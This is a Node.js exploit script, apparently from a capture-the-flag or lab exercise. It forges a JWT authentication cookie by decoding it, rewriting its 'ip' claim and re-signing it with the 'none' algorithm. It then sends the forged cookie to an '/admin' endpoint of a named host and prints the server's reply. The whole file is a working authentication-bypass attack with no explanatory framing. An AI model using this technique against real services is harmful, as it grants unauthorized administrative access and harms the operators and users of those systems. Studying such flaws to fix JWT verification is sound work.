#!/usr/bin/env node

const jwt = require('jsonwebtoken');
const request = require('request');

if(process.argv.length < 4) {
    console.log("Please give the cookie and new ip as argument")
    process.exit(-1)
}

var cookie = process.argv[2]
var ip = process.argv[3]

console.log("Faking the cookie with ip " + ip)

var decoded = jwt.decode(cookie)
if(!decoded) {
    console.log("Bad cookie")
    process.exit(-1)
}

console.log("The original cookie was " +  JSON.stringify(decoded))

var payload = {...decoded, ip: ip}

console.log("We change it to " + JSON.stringify(payload))


var new_token = jwt.sign(payload, undefined, { algorithm: 'none'});
console.log("The encoded and None-signed token is " + new_token)

var url = 'https://bob-cloud-computing.tk/admin'
var j = request.jar();
var cookie = request.cookie('auth=' + new_token);
j.setCookie(cookie, url);

request({url: url, jar: j}, function (error, response, body) {
  console.log('The response from the vulnerable server is :\n', body); // Print the HTML for the Google homepage.
});
